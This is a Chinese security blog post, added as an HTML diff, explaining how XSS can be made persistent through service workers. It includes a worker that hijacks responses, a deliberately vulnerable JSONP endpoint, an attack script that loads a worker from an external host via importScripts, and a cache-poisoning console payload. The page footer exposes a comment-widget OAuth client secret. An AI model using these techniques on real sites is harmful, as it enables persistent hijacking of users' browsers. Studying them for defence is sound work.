@@ -1,0 +1,255 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.9.0">
+        <meta http-equiv="content-type" content="text/html; charset=utf-8">
+    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+    <title>
+        
+            RootkitXSS之ServiceWorker
+        
+    </title>
+    <link rel="icon" href="/img/favicon.png">
+    <link rel="stylesheet" href="/css/style.css">
+    <link rel="stylesheet" href="/css/font-awesome.min.css">
+    <link rel="stylesheet" href="/css/gitment.css">
+    <link rel="stylesheet" href="/css/hljs.min.css">
+    <script src="/js/hljs.min.js"></script>  
+    <script src="/js/gitment.browser.js"></script>  
+</head>
+<body>
+    <header class="header" id="header">
+    <h1>
+        <a class="title" href="/">
+            Hpdoger
+        </a>
+    </h1>
+    <h2>
+        <a class="motto">
+            Ponyo loves Sōsuke!
+        </a>
+    </h2>
+    <nav class="navbar">
+        <ul class="menu">
+            
+            
+                <li class="menu-item">
+                    <a href="/" class="menu-item-link">
+                        Home
+                    </a>
+                </li>
+            
+                
+            
+                <li class="menu-item">
+                    <a href="/archives/" class="menu-item-link">
+                        Archives
+                    </a>
+                </li>
+            
+                
+            
+                <li class="menu-item">
+                    <a href="/about/" class="menu-item-link">
+                        About
+                    </a>
+                </li>
+            
+                
+            
+                <li class="menu-item">
+                    <a href="https://github.com/Hpd0ger" class="menu-item-link">
+                        Github
+                    </a>
+                </li>
+            
+                
+            
+                <li class="menu-item">
+                    <a href="/atom.xml" class="menu-item-link">
+                        RSS
+                    </a>
+                </li>
+            
+                
+            
+                
+                
+                <li class="menu-item">
+                    <a class="menu-item-link search">
+                        Search                   
+                        <i class="fa fa-long-arrow-right search-icon" aria-hidden="true"></i>
+                    </a>
+                        <input placeholder="Search..." class="search-input" style="display:none;border:none!important;" onkeydown="onEnter(event)" onkeypress="onEnter(event)">
+                </li>
+                
+        </ul>
+    </nav>
+</header>
+    <main class="main">
+        <article class="post">
+            <h1>
+                <a class="title" href="/2018/11/14/RootkitXSS֮ServiceWorker/"> 
+                    RootkitXSS之ServiceWorker 
+                </a>
+            </h1>
+            <div class="meta">
+                <a class="date"> 
+                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
+                    2018-11-14   
+                </a>
+                
+                
+                
+                <a class="tag">
+                    <i class="fa fa-tags" aria-hidden="true"></i>  
+                </a>
+                
+                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/XSS测试/">XSS测试</a></li></ul>
+            </div>
+<div class="toc">
+  <ol class="toc-list"><li class="toc-list-item toc-list-level-1"><a class="toc-list-link" href="#RootkitXSS之ServiceWorker"><span class="toc-list-text">RootkitXSS之ServiceWorker</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#Serviceworker定义"><span class="toc-list-text">Serviceworker定义</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#查看SW服务"><span class="toc-list-text">查看SW服务</span></a></li></ol></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#注册serviceworker"><span class="toc-list-text">注册serviceworker</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#event-request-clone"><span class="toc-list-text">event.request.clone()</span></a></li></ol></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#攻击条件"><span class="toc-list-text">攻击条件</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#一个可以XSS的点"><span class="toc-list-text">一个可以XSS的点</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#sw文件可控"><span class="toc-list-text">sw文件可控</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#jsonp回调接口"><span class="toc-list-text">jsonp回调接口</span></a></li></ol></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#局限"><span class="toc-list-text">局限</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#Cache缓存污染"><span class="toc-list-text">Cache缓存污染</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#请求资源"><span class="toc-list-text">请求资源</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#分析"><span class="toc-list-text">分析</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#相关链接"><span class="toc-list-text">相关链接</span></a></li></ol></li></ol>
+</div>
+            <div class="content">
+                <h1 id="RootkitXSS之ServiceWorker"><a href="#RootkitXSS之ServiceWorker" class="headerlink" title="RootkitXSS之ServiceWorker"></a>RootkitXSS之ServiceWorker</h1><p>文章首发于先知：<a href="https://xz.aliyun.com/t/3228#toc-10" target="_blank" rel="noopener">https://xz.aliyun.com/t/3228#toc-10</a></p>
+<p>在拿到一个可以XSS点的时候后，持久化成为一种问题。这几天跟师傅们接触到RootkiXss的一些姿势，受益匪浅</p>
+<h2 id="Serviceworker定义"><a href="#Serviceworker定义" class="headerlink" title="Serviceworker定义"></a>Serviceworker定义</h2><p>Service workers(后文称SW) 本质上充当Web应用程序与浏览器之间的代理服务器，也可以在网络可用时作为浏览器和网络间的代理。它们旨在（除其他之外）使得能够创建有效的离线体验，拦截网络请求并基于网络是否可用以及更新的资源是否驻留在服务器上来采取适当的动作。他们还允许访问推送通知和后台同步API。</p>
+<p>也就是说SW 提供了一组API，能够拦截当前站点产生HTTP请求，还能控制返回结果。因此，SW 拦住请求后，使用 Cache Storage 里的内容进行返回，就可以实现离线缓存的功能。当Cache Storage不存在请求的资源时再向服务器请求,cache.put可以选择性地将请求资源加载到cache storage中。如果不手动取消已经注册过的sw服务,刷新/重新打开页面都会启动站点的sw服务，这为我们持久化XSS提供了一定的条件。</p>
+<h3 id="查看SW服务"><a href="#查看SW服务" class="headerlink" title="查看SW服务"></a>查看SW服务</h3><p>Chrome地址栏访问 chrome://serviceworker-internals/，就可以看见已有的后台服务。</p>
+<h2 id="注册serviceworker"><a href="#注册serviceworker" class="headerlink" title="注册serviceworker"></a>注册serviceworker</h2><p>注册点js代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">	var url=&quot;//localhost/serviceworker.js&quot;;</span><br><span class="line">	if (&apos;serviceWorker&apos; in navigator) &#123;</span><br><span class="line"> navigator.serviceWorker.register(url)</span><br><span class="line"> .then(function(registration) &#123;</span><br><span class="line"> console.log(&apos;ServiceWorker registration successful with scope: &apos;, registration.scope);</span><br><span class="line"> &#125;)</span><br><span class="line">&#125;;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">normal visit</span><br></pre></td></tr></table></figure>
+
+<p>script标签下的type必须指明为<code>text/javascript</code></p>
+<h3 id="event-request-clone"><a href="#event-request-clone" class="headerlink" title="event.request.clone()"></a>event.request.clone()</h3><p>对象的内容如图<br><img src="https://i.loli.net/2018/11/03/5bdd0e7b665f4.png" alt></p>
+<h2 id="攻击条件"><a href="#攻击条件" class="headerlink" title="攻击条件"></a>攻击条件</h2><h3 id="一个可以XSS的点"><a href="#一个可以XSS的点" class="headerlink" title="一个可以XSS的点"></a>一个可以XSS的点</h3><h3 id="sw文件可控"><a href="#sw文件可控" class="headerlink" title="sw文件可控"></a>sw文件可控</h3><p>如果说sw可以放在同源下,也就是js文件可控的话。直接注册Sw，代码如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">// 拦截特定的Url，如果请求是对应的Url，则返回攻击的response</span><br><span class="line">self.addEventListener(&apos;fetch&apos;, function (event) &#123;  </span><br><span class="line">    var url = event.request.clone(); </span><br><span class="line">    body = &apos;&lt;script&gt;alert(&quot;test&quot;)&lt;/script&gt;&apos;;</span><br><span class="line">    init = &#123;headers: &#123; &apos;Content-Type&apos;: &apos;text/html&apos; &#125;&#125;;</span><br><span class="line">    if(url.url==&apos;http://localhost/reurl.html&apos;)&#123;</span><br><span class="line">        res  = new Response(body,init);</span><br><span class="line">        event.respondWith(res.clone());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<h3 id="jsonp回调接口"><a href="#jsonp回调接口" class="headerlink" title="jsonp回调接口"></a>jsonp回调接口</h3><p>利用储值型X点写入下面的代码</p>
+<p>当JSONP接口存在缺陷时，比如没有校验回调名。导致返回内容可控<br>比如：url?callback=importScript(…)<br>返回<code>importScript(...)</code><br>代码实现如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// JSONP 回调名缺少校验</span><br><span class="line">$cb_name = $_GET[&apos;callback&apos;];</span><br><span class="line">$cb_data = time();</span><br><span class="line"></span><br><span class="line">header(&apos;Content-Type: application/javascript&apos;);</span><br><span class="line">echo(&quot;$cb_name($cb_data)&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>attack_js</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">	var url=&quot;//localhost/getdata?callback=importScripts(&apos;//third.com/sw.js?g&apos;)&quot;;</span><br><span class="line">	if (&apos;serviceWorker&apos; in navigator) &#123;</span><br><span class="line"> navigator.serviceWorker.register(url)</span><br><span class="line"> .then(function(registration) &#123;</span><br><span class="line"> console.log(&apos;ServiceWorker registration successful with scope: &apos;, registration.scope);</span><br><span class="line"> &#125;)</span><br><span class="line">&#125;;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这里面callback回调的事件就相当于sw脚本。当js被执行之后会注册一个sw脚本,内容是回调的事件<br><img src="https://i.loli.net/2018/11/05/5be04f7b70f25.png" alt><br><img src="https://i.loli.net/2018/11/05/5be04f9d988ca.png" alt></p>
+<p>或者鸡肋上传一个html到网站下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html;charset=utf-8&quot; /&gt; </span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">	var url=&quot;//localhost/getdata?callback=importScripts(&apos;//third.com/sw.js?g&apos;)&quot;;</span><br><span class="line">	if (&apos;serviceWorker&apos; in navigator) &#123;</span><br><span class="line"> navigator.serviceWorker.register(url)</span><br><span class="line"> .then(function(registration) &#123;</span><br><span class="line"> console.log(&apos;ServiceWorker registration successful with scope: &apos;, registration.scope);</span><br><span class="line"> &#125;)</span><br><span class="line">&#125;;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">it&apos;s nothing</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="局限"><a href="#局限" class="headerlink" title="局限"></a>局限</h2><ul>
+<li>存在有缺陷的 JSONP 接口</li>
+<li>JSONP 的目录尽可能浅（最好在根目录下），如果放在域的根目录下，将会收到这个域下的所有fetch事件</li>
+<li>JSONP 返回的 Content-Type 必须是 JS 类型</li>
+<li>存在 XSS 的页面</li>
+</ul>
+<p>在网上看到一个师傅这样作例,引用一下：<br>service worker文件被放在这个域的根目录下，这意味着service worker和网站同源。换句话说，这个service work将会收到这个域下的所有fetch事件。如果我将service worker文件注册为/example/sw.js，那么，service worker只能收到/example/路径下的fetch事件（例如： /example/page1/, /example/page2/）</p>
+<h2 id="Cache缓存污染"><a href="#Cache缓存污染" class="headerlink" title="Cache缓存污染"></a>Cache缓存污染</h2><p>前文的攻击不涉及cache里的资源,进行的是协商缓存，下面说一下强缓存的利用。</p>
+<h2 id="请求资源"><a href="#请求资源" class="headerlink" title="请求资源"></a>请求资源</h2><p>如果使用cache.put方法，则请求的资源成功后会存在Cache Storage里。如果fetch里写了caches.match(event.request)方法，则每次请求时会先从caches找缓存来优先返回给请求页面。若没有缓存，再进行新的缓存操作。</p>
+<p>下面是一个缓存读取/判断的demo</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">// 拦截特定的Url，如果请求是对应的Url，则返回攻击的response。否则用Fetch请求网络上原本的url，进行本地缓存(为了不影响正常功能))</span><br><span class="line">self.addEventListener(&apos;fetch&apos;, function (event) &#123;  </span><br><span class="line">        event.respondWith(</span><br><span class="line">            //console.log(event.request)</span><br><span class="line">        caches.match(event.request).then(function(res)&#123;</span><br><span class="line">        if(res)&#123;//如果有缓存则使用缓存</span><br><span class="line">        return res;</span><br><span class="line">        &#125;</span><br><span class="line">        return requestBackend(event);//没缓存就进行缓存</span><br><span class="line">        &#125;)</span><br><span class="line">        )</span><br><span class="line">   &#125;);</span><br><span class="line">   </span><br><span class="line">function requestBackend(event)&#123;  </span><br><span class="line">        var url = event.request.clone();  </span><br><span class="line">        console.log(url)  //打印内容是打印到请求页面</span><br><span class="line">        if(url.url==&apos;http://localhost/reurl.html&apos;)&#123;//判断是否为需要劫持的资源</span><br><span class="line">    </span><br><span class="line">        return new Response(&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;, &#123;headers: &#123; &apos;Content-Type&apos;: &apos;text/html&apos; &#125;&#125;)</span><br><span class="line">        &#125;</span><br><span class="line">        return fetch(url).then(function(res)&#123;</span><br><span class="line">        //检测是否为有效响应</span><br><span class="line">        if(!res || res.status !== 200 || res.type !== &apos;basic&apos;)&#123;</span><br><span class="line">        return res;</span><br><span class="line">        &#125;</span><br><span class="line">        var response = res.clone();</span><br><span class="line">        caches.open(&apos;v1&apos;).then(function(cache)&#123;  //打开v1缓存进行存储</span><br><span class="line">        cache.put(event.request, response);</span><br><span class="line">        &#125;);</span><br><span class="line">    </span><br><span class="line">        return res;</span><br><span class="line">        &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>前几天看ED师傅的研究,发现这种好玩但是鸡肋的方法。上面提到cache.put的方法把js资源添加到Cache Storage，其实如果我们用cache.put把恶意代码插入,覆盖原始的js数据。后果就是当sw请求cahce里的资源时会执行恶意代码。比如workbox会先从缓存读取静态资源,我们用异步请求将恶意代码无限覆盖这个缓存时：</p>
+<p>控制台输入下面的恶意代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">async function replay() &#123;</span><br><span class="line">    const name = &apos;xx&apos;</span><br><span class="line">    const url = &apos;xx&apos;</span><br><span class="line">    const payload = `</span><br><span class="line">alert(1);</span><br><span class="line">`</span><br><span class="line">    let cache = await caches.open(name);</span><br><span class="line">    let req = new Request(url);</span><br><span class="line">    let res = new Response(payload + replay + &apos;;replay()&apos;);   //执行alert+写入cache内容+执行fn</span><br><span class="line">    setInterval(_ =&gt; &#123;</span><br><span class="line">      cache.put(req, res.clone());</span><br><span class="line">    &#125;, 500);</span><br><span class="line">&#125;</span><br><span class="line">replay();</span><br></pre></td></tr></table></figure>
+
+<p>就可以在cache Storage里看到500ms刷新并覆盖一次的js资源。<br><img src="https://i.loli.net/2018/11/05/5be0502e0dd09.png" alt></p>
+<h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p>Service Worker API(<a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Service_Worker_API" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/Web/API/Service_Worker_API</a>)</p>
+<p>浏览器缓存知识(<a href="https://www.cnblogs.com/lyzg/p/5125934.html" target="_blank" rel="noopener">https://www.cnblogs.com/lyzg/p/5125934.html</a>)</p>
+
+            </div>
+          
+           
+            <div class="copyright">
+                <div class="name">
+                    <a>Author:</a>
+                    <a>Sōsuke</a>
+                </div>
+                <div class="link">
+                    <a>Link:</a>
+                    <a class="permalink" href="https://hpdoger.cn/2018/11/14/RootkitXSS֮ServiceWorker/">https://hpdoger.cn/2018/11/14/RootkitXSS֮ServiceWorker/</a>
+                </div>
+                <div class="license">
+                    <a>Statement:</a>
+                    <a>All articles in this blog shall be licensed by CC BY-NC-SA 3.0 CN, unless otherwise stated. Please indicate the provenance!</a>
+                </div>
+            </div>
+            
+
+          
+
+
+</article>
+
+
+<div class="tip">
+<button class="tip-btn">
+    Tip
+</button>
+<div class="tip-img">
+<ul>
+    
+ 
+</ul>
+</div>
+</div>
+
+<div class="more">
+
+    <div class="prev">
+   <a href="/2018/12/17/HCTF2018线下赛感想/">  HCTF2018线下赛感想</a>
+    </div>
+
+<div></div>
+
+    <div class="next">
+    <a href="/2018/11/13/HCTF题解/"> HCTF2018线上赛部分WriteUp </a>
+    </div>
+    
+</div>
+
+<div class="bdsharebuttonbox">
+<a href="#" class="bds_weixin fa fa-weixin" data-cmd="weixin" title="分享到微信" style="color:#1cbd8f">
+</a>
+<a href="#" class="bds_tsina fa fa-weibo" data-cmd="tsina" title="分享到新浪微博" style="color:#ff6363">
+</a>
+<a href="#" class="bds_twi fa fa-twitter" data-cmd="twi" title="分享到Twitter" style="color:#00A7EB">
+</a>
+<a href="#" class="bds_fbook fa fa-facebook" data-cmd="fbook" title="分享到Facebook" style="color:#00A7EB">
+</a>
+</div>
+<script>
+window._bd_share_config={
+    "common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"1","bdSize":"16"},
+    "share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='../../../../../static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+</script>
+ 
+<div id="comments"></div>
+
+<script>
+    var gitment = new Gitment({
+    id: "Wed Nov 14 2018 00:00:00 GMT+0800",
+    owner: "Hpd0ger",
+    repo: "Hpd0ger.github.io",
+    oauth: {
+      client_id:"8d83609a651e972e308d",
+      client_secret: "37e40c89a47e957f654e86f71c5caaccad0774de",
+    }
+  })
+  gitment.render('comments')
+</script>
+    </main>
+    <a class="not-found">not found!</a>
+    <div class="search-items">
+    </div>
+    <a href="#header" id="top" style="display:none">
+        <i class="fa fa-sort-asc fa-2x"></i>
+    </a>
+    <footer class="footer">
+    <div class="footer-copyright">©️2017
+    <a href="//github.com/Vevlins/toki" class="link" target="_blank">Toki</a>  by Vevlins
+    </div>
+</footer>
+
+    <script src="/js/jquery.js"></script>
+    <script src="/js/toki.js"></script>  
+  <script>hljs.initHighlightingOnLoad();</script>
+</body>
+</html>
